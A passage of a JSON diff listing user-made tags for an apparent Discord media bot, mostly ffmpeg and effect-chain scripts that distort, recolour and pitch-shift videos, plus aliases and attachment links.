+  "gm47": {
+    "script": "{ihtx:mirror=0,mirror=90,invert,channelblend=g;g;0,pitch=-2}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T14:06:08.520Z",
+    "updatedAt": "2026-06-15T14:06:08.520Z"
+  },
+  "gm48": {
+    "script": "{ihtx:huehsv=-144,swirl=-150,pitch=0;3}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T14:13:40.865Z",
+    "updatedAt": "2026-06-15T14:13:40.865Z"
+  },
+  "solgryn_gm": {
+    "script": "{ihtx:hue=232.65,invert,tvsim=0.75,shakev=6.5,hflip,shakev=6.5,hflip,pitch=-12;-9;0;3;15}",
+    "ownerId": "1454901686186410144",
+    "ownerUsername": "solgrynplayzxd",
+    "createdAt": "2026-06-15T14:14:47.417Z",
+    "updatedAt": "2026-06-15T14:14:47.417Z"
+  },
+  "entt’s_gm": {
+    "script": "ENTT’s_Luigigroup {imagescript:\nload {iv} i\ngradientmap=[[0,0,255,255],[0,255,255,255],[255,0,0,255]]\nfisheye=2\npitch=-1\n}",
+    "ownerId": "1221656858612203581",
+    "ownerUsername": "gucci_17__75369",
+    "createdAt": "2026-06-15T14:16:28.624Z",
+    "updatedAt": "2026-06-15T14:17:43.674Z"
+  },
+  "tacomamajor": {
+    "script": "{ihtx:swapuv,invlum,pitch=0;-24 50 0.36}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T14:17:55.230Z",
+    "updatedAt": "2026-06-15T14:17:55.230Z"
+  },
+  "entt’s_luigigroup": {
+    "script": "{imagescript:\nload {iv} i\ngradientmap=[[0,0,255,255],[0,255,255,255],[255,0,0,255]]\nfisheye=2\npitch=-1\n}",
+    "ownerId": "1221656858612203581",
+    "ownerUsername": "gucci_17__75369",
+    "createdAt": "2026-06-15T14:17:56.958Z",
+    "updatedAt": "2026-06-15T14:17:56.958Z"
+  },
+  "tacoma_major": {
+    "script": "{ihtx:swapuv,invlum,pitch=0;-24 50 0.36}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T14:18:02.631Z",
+    "updatedAt": "2026-06-15T14:18:02.631Z"
+  },
+  "tacoma": {
+    "script": "{ihtx:swapuv,invlum,pitch=0;-24 50 0.36}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T14:18:05.717Z",
+    "updatedAt": "2026-06-15T14:18:05.717Z"
+  },
+  "opposite_entt’s_luigigroup": {
+    "script": "{imagescript:\nload {iv} i\ngradientmap=[[255,0,0,255],[255,255,0,255],[0,0,255,255]]\nfisheye=-2\npitch=1\n}",
+    "ownerId": "1221656858612203581",
+    "ownerUsername": "gucci_17__75369",
+    "createdAt": "2026-06-15T14:20:17.986Z",
+    "updatedAt": "2026-06-15T14:20:36.983Z"
+  },
+  "logobotomy_gm42": {
+    "script": "{ihtx:invert,rightsplit(huehsv=180,channelblend=b;g;r,hflip,invert),pitch=0;3;-1;2}",
+    "ownerId": "1454901686186410144",
+    "ownerUsername": "solgrynplayzxd",
+    "createdAt": "2026-06-15T14:20:55.456Z",
+    "updatedAt": "2026-06-15T14:23:21.471Z"
+  },
+  "snip": {
+    "script": "{sh:\nload {iv}\n\nd=$(ffprobe -i $FILE_1 -show_entries format=duration -v quiet -of csv=\"p=0\")\nw=$(ffprobe -v error -select_streams v:0 -show_entries stream=width -of default=nw=1:nk=1 $FILE_1)\n\nffmpeg -i \"$FILE_1\" -vf trim=start={arg:0},trim=end={or:{arg:1}|$d} -af atrim=start={arg:0},atrim=end={or:{arg:1}|$d} output/snip.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-15T14:21:28.769Z",
+    "updatedAt": "2026-06-15T14:25:49.085Z"
+  },
+  "speakerkill.vis": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\ntvsim i 0.696\nlut i https://files.catbox.moe/ul5cog.cube\n}",
+    "ownerId": "1298900047458729984",
+    "ownerUsername": "dazdisc0rd",
+    "createdAt": "2026-06-15T14:22:51.965Z",
+    "updatedAt": "2026-06-15T14:22:51.965Z"
+  },
+  "radar": {
+    "script": "{ihtx:huehsv=32,saturation=3,radar,pitch=0;1;3}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T14:33:34.856Z",
+    "updatedAt": "2026-06-15T14:33:34.856Z"
+  },
+  "radarmajmor": {
+    "script": "{tag:radar}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T14:34:01.452Z",
+    "updatedAt": "2026-06-15T14:34:01.452Z"
+  },
+  "radar_majmor": {
+    "script": "{tag:radar}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T14:34:05.822Z",
+    "updatedAt": "2026-06-15T14:34:05.822Z"
+  },
+  "confusion_ffmpeg": {
+    "script": "lut=https://files.catbox.moe/fkuceb.cube",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-15T14:34:31.431Z",
+    "updatedAt": "2026-06-15T14:34:31.431Z"
+  },
+  "confusionffmpeg": {
+    "script": "lut=https://files.catbox.moe/fkuceb.cube,rightmirror, reverse=audio",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-15T14:35:35.814Z",
+    "updatedAt": "2026-06-15T14:35:35.814Z"
+  },
+  "unoriginal-gm441": {
+    "script": "{ihtx:huehsv=180,invlum,invlum,huehsv=30,invert,gm4,mirror=90,areverse,pitch=-5;-2;-7;-4;1;-2;-1;-4;0;3;-2;1;6;3;4;1}",
+    "ownerId": "1015244363518988340",
+    "ownerUsername": "fss1641",
+    "createdAt": "2026-06-15T15:26:44.274Z",
+    "updatedAt": "2026-06-15T15:26:44.274Z"
+  },
+  "request-juice": {
+    "script": "{ihtx:hue=180,invert,invertrgb=0;0;1,pitch=5;8}",
+    "ownerId": "1015244363518988340",
+    "ownerUsername": "fss1641",
+    "createdAt": "2026-06-15T15:32:35.802Z",
+    "updatedAt": "2026-06-15T15:34:47.692Z"
+  },
+  "swapuv": {
+    "script": "{ihtx:swapuv}",
+    "ownerId": "1486791790882324520",
+    "ownerUsername": "bytp64_second_account",
+    "createdAt": "2026-06-15T15:38:22.355Z",
+    "updatedAt": "2026-06-15T15:38:22.355Z"
+  },
+  "convert": {
+    "script": "{sh:\nload {iv}\nffmpeg \"$FILE_1\" ./output/convert.{arg:0}\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-15T18:00:09.988Z",
+    "updatedAt": "2026-06-15T18:13:02.035Z"
+  },
+  "icall": {
+    "script": "{attach:https://files.catbox.moe/sexxrr.mp4}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-15T18:34:41.825Z",
+    "updatedAt": "2026-06-15T18:35:37.232Z"
+  },
+  "widescreen": {
+    "script": "{sh:load {iv}\nffmpeg -i $FILE_1 -vf \"scale=640:360\" ./output/$(basename $FILE_1)}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-15T18:38:41.128Z",
+    "updatedAt": "2026-06-15T18:55:16.361Z"
+  },
+  "16:9": {
+    "script": "{tag:widescreen}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-15T18:41:23.431Z",
+    "updatedAt": "2026-06-15T18:41:23.431Z"
+  },
+  "diyi": {
+    "script": "{attach:https://files.catbox.moe/m7xbue.mp4}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-16T05:37:34.648Z",
+    "updatedAt": "2026-06-16T05:37:34.648Z"
+  },
+  "angry_ffmpeg": {
+    "script": "{sh:load {iv}\nffmpeg -i $FILE_1 -vf v360=22:fisheye:7,scale=iw*2:ih*2,swapuv,hue=h=-120,negate,hue=h=180,\"crop=iw/2:ih:0:0,split[left][tmp];[tmp]hflip[right];[left][right]hstack\" -filter_complex \"[0:a]rubberband=formant=712923000:pitch=2^(0/12)[a1];[0:a]rubberband=formant=712923000:pitch=2^(-2/12)[a2];[a1][a2]amix=2,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,acontrast=100,atrim=0.02[outa]\" -map 0:v -map \"[outa]\" ./output/angry.mp4}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-16T05:43:28.199Z",
+    "updatedAt": "2026-06-16T05:44:29.483Z"
+  },
+  "boul123major": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i 90\nsaturation i 2\nwave i 0 4 0 0.5 31 31\npitch i 3\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T10:57:40.636Z",
+    "updatedAt": "2026-06-16T10:57:40.636Z"
+  },
+  "boul123_major": {
+    "script": "{tag:boul123major}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T10:57:51.962Z",
+    "updatedAt": "2026-06-16T10:57:51.962Z"
+  },
+  "boul123": {
+    "script": "{tag:boul123major}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T10:57:54.220Z",
+    "updatedAt": "2026-06-16T10:57:54.220Z"
+  },
+  "gm49": {
+    "script": "{ihtx:huehsv=126,mirror=180,mirror=90,pitch=-0.69;0}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T11:03:01.072Z",
+    "updatedAt": "2026-06-16T11:03:01.072Z"
+  },
+  "typescript": {
+    "script": "{ts:{arg:*}}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-16T12:00:53.370Z",
+    "updatedAt": "2026-06-16T12:00:53.370Z"
+  },
+  "graphing": {
+    "script": "{tag:graphingcalculator}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-16T12:11:33.897Z",
+    "updatedAt": "2026-06-16T12:11:33.897Z"
+  },
+  "graph": {
+    "script": "{tag:graphingcalculator}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-16T12:11:39.774Z",
+    "updatedAt": "2026-06-16T12:11:39.774Z"
+  },
+  "gm50": {
+    "script": "{ihtx:swapuv,invlum,pitch=6;9}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T12:15:59.859Z",
+    "updatedAt": "2026-06-16T12:15:59.859Z"
+  },
+  "gm51": {
+    "script": "{ihtx:hflip,invert,huehsv=144,wave=10;10;1;1;31;31;3,pitch=0;-5}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T12:25:36.857Z",
+    "updatedAt": "2026-06-16T12:25:36.857Z"
+  },
+  "gm-ihtx": {
+    "script": "{ihtx:invert,pitch=-12;-5;0;4;7;12 10 0.475}",
+    "ownerId": "1498718091734024355",
+    "ownerUsername": "sm14cheryl_84874",
+    "createdAt": "2026-06-16T12:31:31.852Z",
+    "updatedAt": "2026-06-16T12:31:31.852Z"
+  },
+  "ihtxsource1": {
+    "script": "https://files.catbox.moe/0vrwxy.mp4",
+    "ownerId": "1498718091734024355",
+    "ownerUsername": "sm14cheryl_84874",
+    "createdAt": "2026-06-16T12:34:03.132Z",
+    "updatedAt": "2026-06-16T12:34:03.132Z"
+  },
+  "gm52": {
+    "script": "{ihtx:huehsv=45,invert,fisheye=0.5,tvsim=0.905,scroll=0;0.04,pitch=7.5;12.4}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T12:34:53.160Z",
+    "updatedAt": "2026-06-16T12:34:53.160Z"
+  },
+  "gm53": {
+    "script": "{ihtx:huehsv=90,swirl=-150,pitch=3.6;5.4}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T12:36:39.866Z",
+    "updatedAt": "2026-06-16T12:36:39.866Z"
+  },
+  "sad": {
+    "script": "{ihtx:invert,hue=-135,wave=0;3;0;5;31;175,pitch=0;-7}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T12:46:37.862Z",
+    "updatedAt": "2026-06-16T12:46:37.862Z"
+  },
+  "sadx": {
+    "script": "{tag:sad}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T12:46:54.799Z",
+    "updatedAt": "2026-06-16T12:46:54.799Z"
+  },
+  "sad_x": {
+    "script": "{tag:sad}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T12:46:57.591Z",
+    "updatedAt": "2026-06-16T12:46:57.591Z"
+  },
+  "gm55": {
+    "script": "{ihtx:swapuv,huehsv=262,wave=0;3;0;5;31;175,mirror=90,pitch=9}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T12:49:42.081Z",
+    "updatedAt": "2026-06-16T12:49:42.081Z"
+  },
+  "percy": {
+    "script": "{ihtx:huehsv=180,pitch=5}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T12:52:11.247Z",
+    "updatedAt": "2026-06-16T12:52:11.247Z"
+  },
+  "theusergm5": {
+    "script": "theuser10gm5 {ihtx: rightsplit(hue=180,tvsim=0.75),pitch=0;-2.5}",
+    "ownerId": "1515662120820408461",
+    "ownerUsername": "game04082",
+    "createdAt": "2026-06-16T12:53:47.245Z",
+    "updatedAt": "2026-06-16T12:54:32.403Z"
+  },
+  "theuser10gm5": {
+    "script": "{ihtx: rightsplit(hue=180,tvsim=0.75), pitch=0;-2.5}",
+    "ownerId": "1515662120820408461",
+    "ownerUsername": "game04082",
+    "createdAt": "2026-06-16T12:56:50.721Z",
+    "updatedAt": "2026-06-16T12:56:50.721Z"
+  },
+  "gm56": {
+    "script": "{ihtx:lut=https://files.catbox.moe/8foqau.cube ,wave=0;8;0;2;31;31;6,pitch=-13;-10;-7;-4;0;4;7}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T13:01:53.429Z",
+    "updatedAt": "2026-06-16T13:03:01.254Z"
+  },
+  "gm43": {
+    "script": "{sh:\nload {iv}\n\nw=$(ffprobe -v error -select_streams v:0 -show_entries stream=width -of default=nw=1:nk=1 $FILE_1)\nh=$(ffprobe -v error -select_streams v:0 -show_entries stream=height -of default=nw=1:nk=1 $FILE_1)\nfc=$(ffprobe -v error -select_streams v:0 -show_entries stream=nb_frames -of default=nokey=1:noprint_wrappers=1 $FILE_1)\nd=$(ffprobe -i $FILE_1 -show_entries format=duration -v quiet -of csv=\"p=0\")\n\nffmpeg -i $FILE_1 -vf negate,huesaturation=hue=-144:strength=100,format=yuv444p,scale=640:640,\"geq='p(X-((sin((T*5*0+(0*15))+(Y/H)*(PI*0)))*(-15*0)),Y-((sin((T*5*0+(0*15))+(X/W)*(PI*10)))*(-15*1)))'\",scale=$w:$h,setsar=1:1,format=yuv420p,crop=$w/2:$h,scale=$w:$h,setsar=1,format=yuv444p,\"geq='p(W*0.5+(X-W*0.5)*max(1-(1)*gauss(-3.3333*pow(hypot((X-W*0.5)/(W*0.5),(Y-H*0.5)/(H*0.5)),2)),0),H*0.5+(Y-H*0.5)*max(1-(1)*gauss(-3.3333*pow(hypot((X-W*0.5)/(W*0.5),(Y-H*0.5)/(H*0.5)),2)),0))'\",scale=iw:ih,format=yuv420p -filter_complex \"[0:a]rubberband=formant=712923000:pitch=2^(-2/12)[a1];[0:a]rubberband=formant=712923000:pitch=2^(0/12)[a2];[0:a]rubberband=formant=712923000:pitch=2^(10/12)[a3];[a1][a2][a3]amix=3,volume=3,atrim=0.02[outa]\" -map 0:v -map \"[outa]\" ./output/gm43.mp4}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T14:08:39.521Z",
+    "updatedAt": "2026-06-16T14:12:15.064Z"
+  },
+  "upside_down": {
+    "script": "{ihtx:vflip,avflip}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T15:59:09.554Z",
+    "updatedAt": "2026-06-16T15:59:09.554Z"
+  },
+  "ud": {
+    "script": "{tag:upside_down}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T15:59:25.354Z",
+    "updatedAt": "2026-06-16T15:59:25.354Z"
+  },
+  "gm57": {
+    "script": "{ihtx:swirl=-150,ripple=1;20;20;0,swirl=150,huehsv=180,invert,pitch=9}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T16:08:24.183Z",
+    "updatedAt": "2026-06-16T16:08:24.183Z"
+  },
+  "mclaren": {
+    "script": "{sh:load {iv}\n\nw=$(ffprobe -v error -select_streams v:0 -show_entries stream=width -of default=nw=1:nk=1 $FILE_1)\nh=$(ffprobe -v error -select_streams v:0 -show_entries stream=height -of default=nw=1:nk=1 $FILE_1)\nfc=$(ffprobe -v error -select_streams v:0 -show_entries stream=nb_frames -of default=nokey=1:noprint_wrappers=1 $FILE_1)\nd=$(ffprobe -i $FILE_1 -show_entries format=duration -v quiet -of csv=\"p=0\")\n\nffmpeg -i $FILE_1 -vf huesaturation=45:strength=100,format=yuv444p,scale=$h:$h,\"geq='p(W*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*cos((atan2(Y-H*0.5,X-W*0.5))+((-130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)),H*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*sin((atan2(Y-H*0.5,X-W*0.5))+((-130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)))'\",scale=$w:$h,setsar=1:1,format=yuv420p,crop=$w:$h/2,scale=$w:$h,setsar=1,format=yuv444p,scale=$h:$h,\"geq='p(W*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*cos((atan2(Y-H*0.5,X-W*0.5))+((130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)),H*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*sin((atan2(Y-H*0.5,X-W*0.5))+((130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)))'\",scale=$w:$h,setsar=1:1,format=yuv420p -filter_complex \"[0:a]rubberband=formant=712923000:pitch=2^0.5[a1];[a1]amix=1,volume=1,atrim=0.02[outa]\" -map 0:v -map \"[outa]\" ./output/mclaren.mp4}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T16:22:39.119Z",
+    "updatedAt": "2026-06-16T16:22:39.119Z"
+  },
+  "mclaren_major": {
+    "script": "{sh:load {iv}\n\nw=$(ffprobe -v error -select_streams v:0 -show_entries stream=width -of default=nw=1:nk=1 $FILE_1)\nh=$(ffprobe -v error -select_streams v:0 -show_entries stream=height -of default=nw=1:nk=1 $FILE_1)\nfc=$(ffprobe -v error -select_streams v:0 -show_entries stream=nb_frames -of default=nokey=1:noprint_wrappers=1 $FILE_1)\nd=$(ffprobe -i $FILE_1 -show_entries format=duration -v quiet -of csv=\"p=0\")\n\nffmpeg -i $FILE_1 -vf huesaturation=45:strength=100,format=yuv444p,scale=$h:$h,\"geq='p(W*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*cos((atan2(Y-H*0.5,X-W*0.5))+((-130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)),H*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*sin((atan2(Y-H*0.5,X-W*0.5))+((-130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)))'\",scale=$w:$h,setsar=1:1,format=yuv420p,crop=$w:$h/2,scale=$w:$h,setsar=1,format=yuv444p,scale=$h:$h,\"geq='p(W*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*cos((atan2(Y-H*0.5,X-W*0.5))+((130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)),H*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*sin((atan2(Y-H*0.5,X-W*0.5))+((130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)))'\",scale=$w:$h,setsar=1:1,format=yuv420p -filter_complex \"[0:a]rubberband=formant=712923000:pitch=2^0.5[a1];[a1]amix=1,volume=1,atrim=0.02[outa]\" -map 0:v -map \"[outa]\" ./output/mclaren.mp4}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T16:22:43.579Z",
+    "updatedAt": "2026-06-16T16:22:43.579Z"
+  },
+  "mclarenmajor": {
+    "script": "{sh:load {iv}\n\nw=$(ffprobe -v error -select_streams v:0 -show_entries stream=width -of default=nw=1:nk=1 $FILE_1)\nh=$(ffprobe -v error -select_streams v:0 -show_entries stream=height -of default=nw=1:nk=1 $FILE_1)\nfc=$(ffprobe -v error -select_streams v:0 -show_entries stream=nb_frames -of default=nokey=1:noprint_wrappers=1 $FILE_1)\nd=$(ffprobe -i $FILE_1 -show_entries format=duration -v quiet -of csv=\"p=0\")\n\nffmpeg -i $FILE_1 -vf huesaturation=45:strength=100,format=yuv444p,scale=$h:$h,\"geq='p(W*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*cos((atan2(Y-H*0.5,X-W*0.5))+((-130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)),H*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*sin((atan2(Y-H*0.5,X-W*0.5))+((-130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)))'\",scale=$w:$h,setsar=1:1,format=yuv420p,crop=$w:$h/2,scale=$w:$h,setsar=1,format=yuv444p,scale=$h:$h,\"geq='p(W*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*cos((atan2(Y-H*0.5,X-W*0.5))+((130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)),H*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*sin((atan2(Y-H*0.5,X-W*0.5))+((130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)))'\",scale=$w:$h,setsar=1:1,format=yuv420p -filter_complex \"[0:a]rubberband=formant=712923000:pitch=2^0.5[a1];[a1]amix=1,volume=1,atrim=0.02[outa]\" -map 0:v -map \"[outa]\" ./output/mclaren.mp4}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T16:22:47.249Z",
+    "updatedAt": "2026-06-16T16:22:47.249Z"
+  },
+  "gm58": {
+    "script": "{sh:load {iv}\n\nw=$(ffprobe -v error -select_streams v:0 -show_entries stream=width -of default=nw=1:nk=1 $FILE_1)\nh=$(ffprobe -v error -select_streams v:0 -show_entries stream=height -of default=nw=1:nk=1 $FILE_1)\nfc=$(ffprobe -v error -select_streams v:0 -show_entries stream=nb_frames -of default=nokey=1:noprint_wrappers=1 $FILE_1)\nd=$(ffprobe -i $FILE_1 -show_entries format=duration -v quiet -of csv=\"p=0\")\n\nffmpeg -i $FILE_1 -vf huesaturation=45:strength=100,format=yuv444p,scale=$h:$h,\"geq='p(W*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*cos((atan2(Y-H*0.5,X-W*0.5))+((-130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)),H*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*sin((atan2(Y-H*0.5,X-W*0.5))+((-130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)))'\",scale=$w:$h,setsar=1:1,format=yuv420p,crop=$w:$h/2,scale=$w:$h,setsar=1,format=yuv444p,scale=$h:$h,\"geq='p(W*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*cos((atan2(Y-H*0.5,X-W*0.5))+((130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)),H*0.5+(hypot(X-W*0.5,Y-H*0.5)+1e-6)*sin((atan2(Y-H*0.5,X-W*0.5))+((130)/180*PI)*(if(lt(hypot(X-W*0.5,Y-H*0.5)+1e-6,min(W,H)*0.5),1-(hypot(X-W*0.5,Y-H*0.5)+1e-6)/(min(W,H)*0.5),0)^2)))'\",scale=$w:$h,setsar=1:1,format=yuv420p,reverse -filter_complex \"[0:a]rubberband=formant=712923000:pitch=2^0.5[a1];[a1]amix=1,volume=1,atrim=0.02,areverse[outa]\" -map 0:v -map \"[outa]\" ./output/gm58.mp4}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T16:24:43.029Z",
+    "updatedAt": "2026-06-16T16:24:43.029Z"
+  },
+  ".vs": {
+    "script": "{attach:https://files.catbox.moe/j8hu45.mp4 }",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T16:33:57.715Z",
+    "updatedAt": "2026-06-16T16:34:12.736Z"
+  },
+  "gm59": {
+    "script": "{ihtx:invert,huehsv=150,mirror=270,fisheye=-1,pitch=-8.1;-1.7;0;3.9;15.9}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T16:36:57.634Z",
+    "updatedAt": "2026-06-16T16:36:57.634Z"
+  },
+  "gm60": {
+    "script": "{ihtx:wave=8;8;1;1;31;31;2,rotate=45,wave=0;4;0;2;31;31;2,rotate=-45,swapuv,invert,pitch=-1;2}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T16:51:29.599Z",
+    "updatedAt": "2026-06-16T16:51:29.599Z"
+  },
+  "gm62": {
+    "script": "{ihtx:tvsim=0.5,lut=https://files.catbox.moe/ifqzrb.cube ,pitch=-14;-4;6}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-16T17:01:06.400Z",
+    "updatedAt": "2026-06-18T10:19:46.075Z"
+  },
+  "gm74_ihtx_sonyvegaspro": {
+    "script": "&ihtx lut=https://files.catbox.moe/fkuceb.cube 50 0.46",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-16T17:24:29.001Z",
+    "updatedAt": "2026-06-16T17:27:26.764Z"
+  },
+  "gm74_ihtx": {
+    "script": "&ihtx lut=https://files.catbox.moe/fkuceb.cube 50 0.5",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-16T17:29:12.656Z",
+    "updatedAt": "2026-06-16T17:29:12.656Z"
+  },
+  "argslen": {
+    "script": "{argslen}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-16T17:34:29.288Z",
+    "updatedAt": "2026-06-16T17:34:29.288Z"
+  },
